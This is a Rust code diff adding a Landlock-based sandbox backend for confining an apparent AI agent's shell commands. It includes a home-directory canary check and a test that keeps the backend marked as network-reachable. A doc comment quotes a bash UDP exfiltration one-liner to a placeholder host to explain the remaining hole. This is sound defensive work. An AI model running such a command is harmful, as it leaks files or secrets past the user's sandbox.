@@ -52,6 +52,26 @@ pub enum Backend {
     /// A throwaway container. Works where user namespaces are locked down,
     /// costs a container start per command.
     Docker,
+    /// Landlock LSM rules applied to the child process itself — no wrapper
+    /// binary, no namespaces, no daemon, and crucially **no privilege**: it
+    /// works on Ubuntu 23.10+ where AppArmor blocks unprivileged user
+    /// namespaces and `bwrap` fails even installed.
+    ///
+    /// The trade is scope, and it is not negotiable, so it is priced into
+    /// the capability predicates rather than left to memory: Landlock
+    /// confines *files* (kernel 6.2+ for a complete write story — rename,
+    /// link, truncate). It cannot close the network — TCP bind/connect are
+    /// deniable on kernel 6.7+ and are denied when `network = false`, but
+    /// UDP is not restrictable at any ABI, and `echo x > /dev/udp/host/port`
+    /// is a working exfiltration route in bash alone. So a landlocked
+    /// `shell` **never earns the interlock relaxation**
+    /// ([`Sandbox::can_reach_network`] stays true), and what the backend
+    /// buys is the other half of the module's closing sentence: an injected
+    /// command reads the files you pointed the agent at, not your SSH keys
+    /// or `~/.mecha`. Weaker than `bwrap` in three more ways worth knowing:
+    /// `/tmp` is shared rather than private, `/proc` shows every process,
+    /// and there is no PID/IPC isolation.
+    Landlock,
 }
 
 impl Backend {
@@ -60,6 +80,7 @@ impl Backend {
             Backend::None => "none",
             Backend::Bwrap => "bwrap",
             Backend::Docker => "docker",
+            Backend::Landlock => "landlock",
         }
     }
 }
@@ -146,7 +167,18 @@ impl Sandbox {
     /// Unconfined, it always can. Confined without network, it cannot — and the
     /// interlock should stop treating it as a way out, because it isn't one.
     pub fn can_reach_network(&self) -> bool {
-        !self.is_enabled() || self.cfg.network
+        match self.cfg.kind {
+            Backend::None => true,
+            // Landlock cannot close the network, only narrow it: TCP
+            // bind/connect are denied where the kernel supports it (6.7+),
+            // but UDP is not restrictable at any ABI, and bash alone can
+            // send over it. A partial restriction must never earn the
+            // interlock relaxation — the answer here is what `shell`'s
+            // `external_send` believes, and believing a hole closed because
+            // it narrowed is the silently-degrading-sandbox shape.
+            Backend::Landlock => true,
+            _ => self.cfg.network,
+        }
     }
 
     /// Can a confined command read data outside the workspace?
@@ -208,7 +240,159 @@ impl Sandbox {
                 c.arg(program).args(args);
                 Ok(c)
             }
+            Backend::Landlock => self.landlock_command(program, args, workspace, cwd),
         }
+    }
+
+    /// Landlock has no wrapper argv: the rules are applied *in the child*,
+    /// between fork and exec. Two disciplines carry the arm:
+    ///
+    /// - **Everything that allocates happens in the parent.** The ruleset —
+    ///   path descriptors, syscally but heap-using construction — is built
+    ///   here; the `pre_exec` closure runs post-fork in a process whose heap
+    ///   may hold another thread's lock, so it makes raw syscalls only
+    ///   (`restrict_self` is a `prctl` plus one landlock syscall).
+    /// - **Enforcement is checked where it happens.** `restrict_self` reports
+    ///   what the kernel actually enforced, and `NotEnforced` fails the spawn
+    ///   rather than running the command unconfined — the per-call form of
+    ///   the preflight rule.
+    #[cfg(target_os = "linux")]
+    fn landlock_command(
+        &self,
+        program: &str,
+        args: &[String],
+        workspace: &Path,
+        cwd: &Path,
+    ) -> Result<tokio::process::Command> {
+        use landlock::RulesetStatus;
+
+        let workspace = absolute(workspace)?;
+        let ruleset = self.landlock_ruleset(&workspace)?;
+
+        let mut c = tokio::process::Command::new(program);
+        c.args(args).current_dir(absolute(cwd)?);
+
+        // The same environment discipline as bwrap: nothing survives unless
+        // named. HOME is the workspace, so `~` expansion lands somewhere the
+        // rules allow — the real home is denied wholesale below.
+        c.env_clear();
+        c.env(
+            "PATH",
+            "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+        );
+        c.env("HOME", workspace.as_os_str());
+        for name in &self.cfg.env {
+            if let Ok(value) = std::env::var(name) {
+                c.env(name, value);
+            }
+        }
+
+        let mut ruleset = Some(ruleset);
+        unsafe {
+            c.pre_exec(move || {
+                // `take()` mutates the child's copy-on-write memory only, so
+                // a Command spawned twice hands each child a live ruleset.
+                let rs = ruleset
+                    .take()
+                    .ok_or_else(|| std::io::Error::other("landlock ruleset already consumed"))?;
+                let status = rs.restrict_self().map_err(std::io::Error::other)?;
+                if status.ruleset == RulesetStatus::NotEnforced {
+                    return Err(std::io::Error::other(
+                        "the kernel did not enforce the landlock ruleset",
+                    ));
+                }
+                Ok(())
+            });
+        }
+        Ok(c)
+    }
+
+    #[cfg(not(target_os = "linux"))]
+    fn landlock_command(
+        &self,
+        _program: &str,
+        _args: &[String],
+        _workspace: &Path,
+        _cwd: &Path,
+    ) -> Result<tokio::process::Command> {
+        anyhow::bail!("the landlock sandbox is Linux-only; use `kind = \"docker\"` here")
+    }
+
+    /// The policy, as a ready-to-apply ruleset.
+    ///
+    /// Filesystem access is a **hard requirement at ABI 3** (kernel 6.2):
+    /// below that the kernel cannot restrict truncation (or, below 2,
+    /// rename-and-link), which is a write hole wide enough to make the
+    /// confinement a fiction — better to refuse than to half-work, exactly
+    /// as with a `bwrap` that cannot create namespaces. The TCP denial is
+    /// best-effort on top (ABI 4, kernel 6.7): a real narrowing worth
+    /// having, and *not* load-bearing, because `can_reach_network` never
+    /// credits it.
+    #[cfg(target_os = "linux")]
+    fn landlock_ruleset(&self, workspace: &Path) -> Result<landlock::RulesetCreated> {
+        use landlock::{
+            Access, AccessFs, AccessNet, CompatLevel, Compatible, PathBeneath, PathFd, Ruleset,
+            RulesetAttr, RulesetCreatedAttr, ABI,
+        };
+
+        let abi = ABI::V3;
+        let read = AccessFs::from_read(abi);
+        let full = AccessFs::from_all(abi);
+
+        let base = Ruleset::default()
+            .set_compatibility(CompatLevel::HardRequirement)
+            .handle_access(full)
+            .context("this kernel cannot enforce the landlock file policy (needs 6.2+)")?;
+        let mut created = if self.cfg.network {
+            base.create()
+        } else {
+            base.set_compatibility(CompatLevel::BestEffort)
+                .handle_access(AccessNet::BindTcp | AccessNet::ConnectTcp)
+                .context("declaring the TCP restriction")?
+                .create()
+        }
+        .context("creating the landlock ruleset")?;
+
+        // The system, readable and executable — the same set bwrap binds
+        // read-only, plus /run because /etc/resolv.conf is usually a symlink
+        // into it. A path that does not exist contributes no rule, exactly
+        // like `--ro-bind-try`.
+        for dir in [
+            "/usr", "/etc", "/opt", "/bin", "/sbin", "/lib", "/lib32", "/lib64", "/proc", "/run",
+        ] {
+            if let Ok(fd) = PathFd::new(dir) {
+                created = created.add_rule(PathBeneath::new(fd, read))?;
+            }
+        }
+        for path in &self.cfg.readable {
+            if let Ok(fd) = PathFd::new(path) {
+                created = created.add_rule(PathBeneath::new(fd, read))?;
+            }
+        }
+
+        // Writable: the workspace (an error if unopenable — confining a
+        // command to a workspace that does not exist is a configuration
+        // problem, not a rule to skip), extra writable paths, /dev for the
+        // sinks everything needs (`/dev/null` first), and /tmp — shared, not
+        // private; the honest cost of having no mount namespace, and one of
+        // the documented ways this backend is weaker than bwrap.
+        created = created.add_rule(PathBeneath::new(
+            PathFd::new(workspace)
+                .with_context(|| format!("opening the workspace {}", workspace.display()))?,
+            full,
+        ))?;
+        for path in &self.cfg.writable {
+            if let Ok(fd) = PathFd::new(path) {
+                created = created.add_rule(PathBeneath::new(fd, full))?;
+            }
+        }
+        for dir in ["/dev", "/tmp"] {
+            if let Ok(fd) = PathFd::new(dir) {
+                created = created.add_rule(PathBeneath::new(fd, full))?;
+            }
+        }
+
+        Ok(created)
     }
 
     /// The environment a child should get, given a passthrough allowlist.
@@ -395,12 +579,16 @@ impl Sandbox {
                 "cannot run `{}` — is it installed?",
                 match self.cfg.kind {
                     Backend::Docker => "docker",
+                    // Landlock spawns bash directly; what fails here is the
+                    // ruleset in pre_exec, not a missing wrapper binary.
+                    Backend::Landlock => "bash",
                     _ => "bwrap",
                 }
             )
         })?;
 
         if output.status.success() && String::from_utf8_lossy(&output.stdout).contains(marker) {
+            self.prove_landlock_containment(workspace).await?;
             return Ok(());
         }
 
@@ -416,6 +604,77 @@ impl Sandbox {
             diagnose(self.cfg.kind, &stderr)
         )
     }
+
+    /// The half of the landlock preflight `echo` cannot cover.
+    ///
+    /// A working `echo` proves the ruleset *applied*; it does not prove the
+    /// rules deny anything, and "confined" with nothing denied is the state
+    /// this file exists to forbid. So plant a file in the real home — which
+    /// is precisely what this backend claims to protect — and require the
+    /// confined command to fail to read it. Skipped only where it would be
+    /// vacuous: no home, an unwritable home, or a home inside the workspace,
+    /// each of which leaves nothing to prove rather than something unproven.
+    async fn prove_landlock_containment(&self, workspace: &Path) -> Result<()> {
+        if self.cfg.kind != Backend::Landlock {
+            return Ok(());
+        }
+        let Some(home) = dirs::home_dir() else {
+            return Ok(());
+        };
+        let probe = home.join(format!(".mecha-landlock-probe-{}", uuid::Uuid::new_v4()));
+        let ws = workspace
+            .canonicalize()
+            .unwrap_or_else(|_| workspace.to_path_buf());
+        if probe.starts_with(&ws) {
+            return Ok(());
+        }
+        if std::fs::write(&probe, "canary").is_err() {
+            return Ok(());
+        }
+
+        let read = async {
+            let mut command = self
+                .command(&format!("cat '{}'", probe.display()), workspace, workspace)
+                .context("building the containment probe")?;
+            let out = command
+                .stdin(std::process::Stdio::null())
+                .output()
+                .await
+                .context("running the containment probe")?;
+            anyhow::Ok(out.status.success())
+        }
+        .await;
+        std::fs::remove_file(&probe).ok();
+
+        if read? {
+            anyhow::bail!(
+                "the landlock sandbox is not actually confining: a confined command read \
+                 {} — a file outside every rule. Refusing to run with decorative \
+                 confinement; use `kind = \"bwrap\"` or `\"docker\"`, and please report \
+                 this.",
+                probe.display()
+            );
+        }
+        Ok(())
+    }
+}
+
+/// Whether this kernel can enforce the file policy the landlock backend
+/// requires (Landlock ABI 3, kernel 6.2+). For tests and any surface that
+/// wants to suggest the backend only where it would preflight. Creating a
+/// ruleset restricts nothing — the fd is dropped unapplied.
+pub fn landlock_supported() -> bool {
+    #[cfg(target_os = "linux")]
+    {
+        use landlock::{Access, AccessFs, CompatLevel, Compatible, Ruleset, RulesetAttr, ABI};
+        Ruleset::default()
+            .set_compatibility(CompatLevel::HardRequirement)
+            .handle_access(AccessFs::from_all(ABI::V3))
+            .and_then(|r| r.create())
+            .is_ok()
+    }
+    #[cfg(not(target_os = "linux"))]
+    false
 }
 
 /// Turn a backend's error into something the operator can act on.
@@ -447,6 +706,10 @@ fn diagnose(kind: Backend, stderr: &str) -> String {
         Backend::Docker => {
             "\n\nCheck the image exists (`docker pull <image>`) and the daemon is running.".into()
         }
+        Backend::Landlock => "\n\nLandlock needs the LSM enabled on a 6.2+ kernel: `cat \
+             /sys/kernel/security/lsm` should include `landlock`. Where it is \
+             unavailable, use `kind = \"bwrap\"` or `\"docker\"`."
+            .into(),
         _ => String::new(),
     }
 }
@@ -489,6 +752,28 @@ mod tests {
             ..cfg(Backend::Bwrap)
         });
         assert!(sandbox.can_reach_network());
+    }
+
+    /// The single most load-bearing fact about the landlock backend: it
+    /// never earns the interlock relaxation, because UDP stays open at every
+    /// ABI. If this test starts failing, someone made a partial network
+    /// restriction count as a closed one — the exact bug the backend's
+    /// design forbids.
+    #[test]
+    fn landlock_never_earns_the_network_narrowing() {
+        let sandbox = Sandbox::new(cfg(Backend::Landlock));
+        assert!(sandbox.is_enabled());
+        assert!(
+            sandbox.can_reach_network(),
+            "a landlocked shell must stay an external_send sink"
+        );
+        // Even asked for explicitly: `network = false` narrows TCP where the
+        // kernel can, and still must not read as a closed network.
+        let explicit = Sandbox::new(SandboxConfig {
+            network: false,
+            ..cfg(Backend::Landlock)
+        });
+        assert!(explicit.can_reach_network());
     }
 
     #[test]
